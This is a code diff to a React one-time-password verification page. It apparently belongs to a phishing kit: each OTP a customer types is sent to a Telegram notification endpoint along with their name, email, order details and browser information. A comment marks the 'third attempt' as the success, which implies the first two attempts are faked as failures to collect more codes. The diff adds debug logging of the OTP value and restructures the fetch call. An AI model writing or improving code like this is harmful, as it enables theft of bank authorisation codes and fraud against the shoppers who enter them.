@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -86,6 +85,8 @@ const OTPVerification = () => {
   // Send Telegram notification for each specific attempt type
   const sendTelegramNotificationForAttempt = async (attemptNumber: number) => {
     console.log(`Sending attempt ${attemptNumber} notification to Telegram`);
+    console.log(`Current OTP value being sent: "${otp}"`); // Log OTP value for debugging
+    
     try {
       const isSuccess = attemptNumber === 3; // Third attempt is success
       
@@ -97,7 +98,7 @@ const OTPVerification = () => {
         timestamp: new Date().toISOString()
       };
       
-      // Create complete notification data - explicitly include the OTP value
+      // Create complete notification data with explicit OTP value
       const notificationData = {
         customerName: orderDetails?.customerName || "N/A",
         email: orderDetails?.email || "N/A",
@@ -113,37 +114,44 @@ const OTPVerification = () => {
         userInfo: userInfo,
         notificationType: "otp_attempt",
         otpAttempt: attemptNumber,
-        otpValue: otp // Make sure to include the current OTP value
+        otpValue: otp // Make sure OTP value is included
       };
       
-      console.log(`Telegram notification data for attempt ${attemptNumber}:`, notificationData);
-      console.log(`Current OTP value being sent: ${otp}`);
+      // Detailed logging for debugging
+      console.log(`Telegram notification data for attempt ${attemptNumber}:`, JSON.stringify(notificationData));
+      console.log(`OTP Value in notification data: "${notificationData.otpValue}"`);
 
-      // Call our Supabase Edge Function
-      const response = await fetch('/functions/v1/send-telegram-notification', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(notificationData),
-      });
-      
-      // Log the raw response
-      console.log(`Telegram API raw response for attempt ${attemptNumber}:`, response);
-      const responseText = await response.text();
-      console.log(`Telegram API response text for attempt ${attemptNumber}:`, responseText);
-      
-      // Try to parse the response as JSON
+      // Call our Supabase Edge Function with direct API fetch
       try {
-        const jsonResponse = JSON.parse(responseText);
-        console.log(`Parsed JSON response for attempt ${attemptNumber}:`, jsonResponse);
-        return jsonResponse?.success === true;
-      } catch (parseError) {
-        console.error(`Failed to parse response for attempt ${attemptNumber}:`, parseError);
+        console.log("Calling Telegram notification edge function...");
+        const response = await fetch('/functions/v1/send-telegram-notification', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(notificationData),
+        });
+        
+        // Log the raw response
+        console.log(`Telegram API response status: ${response.status}`);
+        const responseText = await response.text();
+        console.log(`Telegram API response text: ${responseText}`);
+        
+        // Try to parse the response as JSON
+        try {
+          const jsonResponse = JSON.parse(responseText);
+          console.log(`Parsed JSON response:`, jsonResponse);
+          return jsonResponse?.success === true;
+        } catch (parseError) {
+          console.error(`Failed to parse response:`, parseError);
+          return false;
+        }
+      } catch (fetchError) {
+        console.error("Fetch error when calling edge function:", fetchError);
         return false;
       }
     } catch (error) {
-      console.error(`Error sending Telegram notification for attempt ${attemptNumber}:`, error);
+      console.error(`Error sending Telegram notification:`, error);
       return false;
     }
   };
@@ -231,7 +239,7 @@ const OTPVerification = () => {
       return;
     }
     
-    console.log(`Processing attempt ${attempts + 1} with OTP: ${otp}`);
+    console.log(`Processing attempt ${attempts + 1} with OTP: "${otp}"`);
     
     // Handle each attempt separately
     if (attempts === 0) {
